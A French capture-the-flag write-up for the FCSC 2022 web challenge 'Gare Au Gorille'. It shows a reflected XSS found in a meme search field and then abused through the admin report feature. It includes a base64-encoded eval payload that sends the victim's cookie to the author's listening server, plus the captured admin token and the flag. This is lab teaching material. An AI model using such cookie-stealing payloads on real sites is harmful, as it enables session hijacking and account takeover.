# Gare Au Gorille
![Chall](https://github.com/Numb3rsProprety/FCSC2022/blob/main/Gare-Au-Gorille/gareaugorille.PNG?raw=true)


- Category: `Web`
- Points: `490` => `101`
- Difficulty: :star:
- Solves: `300`


**Description**

> J'ai construit un site sans prétention pour stocker ma collection de memes !
>
> `https://gare-au-gorille.france-cybersecurity-challenge.fr/` 
>
>


**Attachments**

- `none`

### :book: Introduction

 Ce CTF etait plutot interessant et introduisait une faille que j'avait assez peu experimente auparavant

**Recon**
![home](![image](https://user-images.githubusercontent.com/64932654/167711362-83b80e2f-f083-4199-ac3a-598aba2f2f82.png))
- Lors de l'arrivee sur le site on remarque:
    - **un field pour chercher des memes**
    - **Un boutton "Meme Gollection" qui ramene vers la homepage**
    - **Un boutton "Ajouter un Meme" qui ramene vers le flag**
    - **Un boutton pour report les memes aux admin.**
    - **Un token nous est attribue**

Je commence tout d'abord par cliquer sur "Ajouter Un Meme" mais evidemment il m'est impossible d'y acceder a moins d'etre admin.
Je passe donc au field et je remarque que quand je donne l'entree ` <script>alert('XSS')</script> ` le script en javascript est execute

![xss](https://github.com/Numb3rsProprety/FCSC2022/blob/main/Gare-Au-Gorille/xss.PNG?raw=true)

Ceci etant fait je cherche un moyen pour exploiter cette faille et je me met donc a examiner la fonction report du site.
En cliquant sur le boutton report le site me redirige vers ce lien:
` https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=meme_01.jpg `
Le parametre search est reutilise dans le report.
On peut donc utiliser ce parametre pour injecter un payload qui renverra le cookie de l'utilisateur executant le programme a notre serveur distant.
Si l'on envoie ce payload a l'administrateur il executera le code javascript et nous enverra son token et nous permettra de nous connecter avec son compte
### :arrows_counterclockwise: Exploitation

Avant tout j'ai setup un serveur d'ecoute pour pouvoir recevoir les cookies.
Je fait un payload qui envoie le token vers mon serveur
(cette data sheet m'a beaucoup aide: https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
notre payload request de fin ressemble donc a ca:
https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=eval(atob('ZG9jdW1lbnQubG9jYXRpb24gPSAnaHR0cDovL2xvY2FsaG9zdDo4MC8/Y29va2llPScgKyBkb2N1bWVudC5kb21haW4rJzogJytkb2N1bWVudC5jb29raWU='))

En attendant un peu on recoit le token sur notre serveur: O9Mv3sFaQD1UpQRLCXVOCzCi0dRbpz4Wy4kGPngZt36MZnR6xZpbHLQRWfDi6T45
On peut maintenant acceder au flag:
```
Congrats here is the flag

Flag: `FCSC{14b15680de4e305b89eaa2a07b137abf4e39b5773f39a4ea7155ca5387c6f59e}`


```
### :checkered_flag: Conclusion

`Gare Au Gorille` Assez cool et demande pas beaucoup de temps.
